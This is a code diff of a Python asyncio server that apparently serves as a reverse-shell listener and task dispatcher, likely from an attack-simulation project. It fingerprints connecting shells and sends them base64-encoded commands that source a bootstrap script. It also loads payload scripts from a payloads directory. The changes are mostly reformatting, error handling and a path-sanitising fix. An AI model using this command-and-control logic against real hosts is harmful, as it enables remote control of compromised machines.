@@ -106,8 +106,8 @@ async def execute_task(task_request: TaskRequest):
         {
             "session_id": session_id,
             "task": task,
-            "stdout": base64.b64encode(stdout.decode("utf-8").strip().encode("utf-8")).decode("utf-8"),
-            "stderr": base64.b64encode(stderr.decode("utf-8").strip().encode("utf-8")).decode("utf-8"),
+            "stdout": base64.b64encode(stdout.decode('utf-8').strip().encode('utf-8')).decode('utf-8'),
+            "stderr": base64.b64encode(stderr.decode('utf-8').strip().encode('utf-8')).decode('utf-8'),
             "returncode": proc.returncode,
         }
     )
@@ -153,11 +153,20 @@ def get_payload(task, platform="linux"):
         extension = "sh"
     else:
         extension = "ps1"
+    # search the default payloads directory first
     if Path(Path.cwd(), "payloads", f"{task}.{extension}").exists():
         with open(Path(Path.cwd(), "payloads", f"{task}.{extension}").as_posix(), "r") as f:
             payload_script = f.read()
             # Base64 encode the script
-            payload = base64.b64encode(payload_script.encode("utf-8")).decode("utf-8")
+            payload = base64.b64encode(
+                payload_script.encode('utf-8')).decode('utf-8')
+    # search the lacework-deploy-payloads submodule linux directory second
+    elif Path(Path.cwd(), f"lacework-deploy-payloads/{platform}", f"{task}.{extension}").exists():
+        with open(Path(Path.cwd(), f"lacework-deploy-payloads/{platform}", f"{task}.{extension}").as_posix(), "r") as f:
+            payload_script = f.read()
+            # Base64 encode the script
+            payload = base64.b64encode(
+                payload_script.encode('utf-8')).decode('utf-8')
     else:
         raise Exception(f"Payload not found: {task}")
     return payload
@@ -198,7 +207,8 @@ async def start_keepalive(session):
                 else:
                     command = "echo keepalive_session > C:\\Windows\\Temp\\keepalive_session.txt"
 
-                encoded_payload = base64.b64encode(command.encode("utf-8")).decode("utf-8")
+                encoded_payload = base64.b64encode(
+                    command.encode('utf-8')).decode('utf-8')
                 response = await send_payload_and_get_response(
                     reader=reader,
                     writer=writer,
@@ -226,7 +236,10 @@ async def session_welcome_handler(session):
     addr = session["addr"]
     session_id = session["session_id"]
     platform = session["platform"]
-    logger.info(f"Running welcome handler for new session {addr} on {platform}")
+    error = False
+
+    logger.info(
+        f"Running welcome handler for new session {addr} on {platform}")
 
     # Read the client bootstrap script from file
     try:
@@ -235,7 +248,10 @@ async def session_welcome_handler(session):
         else:
             command = f"echo {session_id} > C:\\Windows\\Temp\\{session_id}.txt"
 
-        encoded_payload = base64.b64encode(command.encode("utf-8")).decode("utf-8")
+        logger.info(f"Sending bootstrap command: {command.strip()}")
+
+        encoded_payload = base64.b64encode(
+            command.encode('utf-8')).decode('utf-8')
         response = await send_payload_and_get_response(
             reader=reader,
             writer=writer,
@@ -247,14 +263,22 @@ async def session_welcome_handler(session):
         )
         logger.info(f"Welcome response from {addr}: {response}")
     except Exception as e:
+        error = True
         logger.error(f"Error reading bootstrap script: {e}")
-        return
+    finally:
+        # close the session if exception occurs
+        if error:
+            writer.close()
+            await writer.wait_closed()
+            session_queue.task_done()
+        # progress to second stage and start the keepalive task
+        else:
+            await asyncio.sleep(5)
+            session["keepalive_task"] = asyncio.create_task(
+                start_keepalive(session))
+            session["bootstrap_sent"] = True
 
-    # Start the keepalive task for this session
-    await asyncio.sleep(5)
-
-    session["keepalive_task"] = asyncio.create_task(start_keepalive(session))
-    session["bootstrap_sent"] = True
+    return error
 
 
 async def client_handler(reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
@@ -288,7 +312,8 @@ async def client_handler(reader: asyncio.StreamReader, writer: asyncio.StreamWri
             forward_data(backend_reader, writer),
         )
     else:
-        logger.info("Empty or non-HTTP data detected; treating as reverse shell connection.")
+        logger.info(
+            "Empty or non-HTTP data detected; treating as reverse shell connection.")
 
         # Create a session dictionary with a flag to indicate if it's new.
         session = {
@@ -301,8 +326,9 @@ async def client_handler(reader: asyncio.StreamReader, writer: asyncio.StreamWri
         }
 
         command = "echo $PSVersionTable.PSVersion|ConvertTo-Json -Compress"
-        encoded_payload = base64.b64encode(command.encode("utf-8")).decode("utf-8")
-        writer.write(f"{encoded_payload}\n".encode("utf-8"))
+        encoded_payload = base64.b64encode(
+            command.encode('utf-8')).decode('utf-8')
+        writer.write(f"{encoded_payload}\n".encode('utf-8'))
         await writer.drain()
         logger.info(f"Sent payload to {addr}: {command.strip()}")
 
@@ -314,25 +340,29 @@ async def client_handler(reader: asyncio.StreamReader, writer: asyncio.StreamWri
             return None
         else:
             # attempt to decode windows utf-8-sig json response
-            logger.info(f"Raw response: {response_line.decode('utf-8').strip()}")
+            logger.info(
+                f"Raw response: {response_line.decode('utf-8').strip()}")
             try:
-                response = json.loads(response_line.decode("utf-8-sig").strip())
-                output = base64.b64decode(response.get("stdout")).decode("utf-8")
+                response = json.loads(
+                    response_line.decode("utf-8-sig").strip())
+                output = base64.b64decode(
+                    response.get("stdout")).decode('utf-8')
             except json.JSONDecodeError:
                 logger.info("Unable to process JSON response")
-                output = response_line.decode("utf-8").strip()
+                output = response_line.decode('utf-8').strip()
 
             if "MinorRevision" in output:
-                logger.info(f"Windows platform detected: Powershell version {output.strip()}")
+                logger.info(
+                    f"Windows platform detected: Powershell version {output.strip()}")
                 session["platform"] = "windows"
                 # BOOTSTRAP_PAYLOAD = get_payload("bootstrap", platform="windows")
             else:
-                logger.info(f"Linux platform assumed - No $PSVersionTable.PSVersion found: {output.strip()}")
+                logger.info(
+                    f"Linux platform assumed - No $PSVersionTable.PSVersion found: {output.strip()}")
                 session["platform"] = "linux"
 
         # Run the welcome handler for this new session
         asyncio.create_task(session_welcome_handler(session))
-
         await session_queue.put(session)
 
 
@@ -360,27 +390,26 @@ async def send_payload_and_get_response(
     """
     # Construct the command that sources the bootstrap and then executes the payload
     if platform == "linux":
-        command_encoded = (
-            f"export REVERSE_SHELL_HOST={REVERSE_SHELL_HOST} REVERSE_SHELL_PORT={REVERSE_SHELL_PORT} ",
-            f"SESSION_ID={session_id} && source <(base64 -d <<< {BOOTSTRAP_PAYLOAD}) ",
-            f"&& decode_payload {encoded_payload}\n",
-        )
+        command_encoded = f"export REVERSE_SHELL_HOST={REVERSE_SHELL_HOST} REVERSE_SHELL_PORT={REVERSE_SHELL_PORT} " \
+            + f"SESSION_ID={session_id} && source <(base64 -d <<< {BOOTSTRAP_PAYLOAD}) " \
+            + f"&& decode_payload {encoded_payload}\n"
     else:
-        command_decoded = base64.b64decode(encoded_payload).decode("utf-8").strip()
-        command = (
-            f"$env:REVERSE_SHELL_HOST='{REVERSE_SHELL_HOST}';$env:REVERSE_SHELL_PORT='{REVERSE_SHELL_PORT}';",
-            f"$env:SESSION_ID='{session_id}';{BOOTSTRAP_PAYLOAD};{command_decoded};",
-        )
-        command_encoded = base64.b64encode(command.encode("utf-8")).decode("utf-8") + "\n"
+        command_decoded = base64.b64decode(
+            encoded_payload).decode('utf-8').strip()
+        command = f"$env:REVERSE_SHELL_HOST='{REVERSE_SHELL_HOST}';$env:REVERSE_SHELL_PORT='{REVERSE_SHELL_PORT}';" \
+            + f"$env:SESSION_ID='{session_id}';{BOOTSTRAP_PAYLOAD};{command_decoded};"
+        command_encoded = base64.b64encode(
+            command.encode('utf-8')).decode('utf-8') + "\n"
 
-    writer.write(command_encoded.encode("utf-8"))
+    writer.write(command_encoded.encode('utf-8'))
     await writer.drain()
     logger.info(f"Sent payload to {addr}: {description.strip()}")
 
     # Ignore the first line (likely the shell prompt)
     if platform == "linux":
         first_line = await reader.readline()
-        logger.debug(f"Ignoring first line (likely prompt): {first_line.decode('utf-8').strip()}")
+        logger.debug(
+            f"Ignoring first line (likely prompt): {first_line.decode('utf-8').strip()}")
 
     # Read the JSON response from the client
     response_line = await reader.readline()
@@ -390,11 +419,13 @@ async def send_payload_and_get_response(
 
     try:
         if platform == "windows":
-            logger.info(f"Response from {addr}: {response_line.decode('utf-8').strip()}")
+            logger.info(
+                f"Response from {addr}: {response_line.decode('utf-8').strip()}")
             response = json.loads(response_line.decode("utf-8-sig").strip())
         else:
-            logger.info(f"Response from {addr}: {response_line.decode('utf-8').strip()}")
-            response = json.loads(response_line.decode("utf-8").strip())
+            logger.info(
+                f"Response from {addr}: {response_line.decode('utf-8').strip()}")
+            response = json.loads(response_line.decode('utf-8').strip())
         logger.info(f"Response from {addr}: {response}")
         return response
     except json.JSONDecodeError:
@@ -416,7 +447,8 @@ async def process_session():
         platform = session["platform"]
         session_id = session["session_id"]
 
-        logger.info(f"Processing session {session_id} from {addr} on {platform}")
+        logger.info(
+            f"Processing session {session_id} from {addr} on {platform}")
 
         # kill the keep alive while executing commands
         session["keepalive_stop"] = True
@@ -434,7 +466,8 @@ async def process_session():
             else:
                 command = 'if (-not ($env:TASK)) { Write-Output "default_payload" } else { Write-Output $env:TASK }\n'
 
-            encoded_payload = base64.b64encode(command.encode("utf-8")).decode("utf-8")
+            encoded_payload = base64.b64encode(
+                command.encode('utf-8')).decode('utf-8')
 
             response = await send_payload_and_get_response(
                 reader=reader,
@@ -449,7 +482,8 @@ async def process_session():
             if response:
                 try:
                     # Optionally decode the stdout field if it is base64-encoded
-                    task = base64.b64decode(response.get("stdout")).decode("utf-8")
+                    task = os.path.basename(base64.b64decode(
+                        response.get("stdout")).decode('utf-8'))
                     logger.info(f"Decoded TASK: {task}")
                 except Exception as e:
                     logger.error(f"Error decoding task: {e}")
